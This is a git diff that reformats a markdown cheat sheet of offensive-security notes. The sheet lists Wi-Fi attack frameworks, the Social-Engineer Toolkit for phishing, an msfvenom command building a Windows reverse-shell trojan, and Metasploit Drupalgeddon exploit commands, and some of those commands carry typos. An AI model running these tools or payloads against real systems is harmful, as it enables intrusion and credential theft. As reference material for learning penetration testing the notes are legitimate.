@@ -69,17 +69,21 @@ More Details at: https://www.hackthebox.com/blog/cve-2022-30190-follina-explaine
 
 # Frameworks to Perform Wi-Fi Attacks
 
-▪ Airgeddon(https://github.com/v1s1t0r1sh3r3/airgeddon)   <br />
-▪ WiFiPhisher(https://github.com/wifiphisher/wifiphisher)   <br />
-▪ WiFiExploitation Framework (https://github.com/D3Ext/WEF)   <br />
- 
+▪ Airgeddon: https://github.com/v1s1t0r1sh3r3/airgeddon   <br />
+▪ WiFiPhisher: https://github.com/wifiphisher/wifiphisher   <br />
+▪ WiFiExploitation Framework: https://github.com/D3Ext/WEF   <br />
+
+```sh 
 python listener.py
-▪ Source: https://www.youtube.com/watch?v=A8DkVDQW1-w
+```
+**More details at:**: https://www.youtube.com/watch?v=A8DkVDQW1-w
 
 Technical Side of Phishing Attacks is Scary Easy to Replicate <br />
 **More details at:** https://github.com/trustedsec/social-engineer-toolkit
 
+```sh
 sudo setoolkit
+```
 
 Select from the menu:
 1) Social-engineering Attacks   <br />
@@ -108,7 +112,7 @@ GET FLOODS   <br />
 
 ## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
 
-MSFvenom(MSFvenom-MetasploitUnleashed (offensive security.com))   <br />
+MSFvenom (MSFvenom-MetasploitUnleashed (offensive security.com))   <br />
  ▪msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP    <br />
 LPORT=PORT –f exe –o file.exe   <br />
 
@@ -123,9 +127,10 @@ Spywareis a type of malware that stays hidden and gathers as much sensitive data
 
 #  SQL Injection
 There are many types of SQL Injection attacks, such as: error based, stacked queries, union based and more;
-
+```sh
 smsf6 exploit(multi/http/drupal_drupageddon) > show options
 msf6 exploit(multi/http/drupal_drupageddon) > exploit
+```
 
 # Brute Forcing Attacks   <br />
  ▪Example software for performing the attack:   <br />
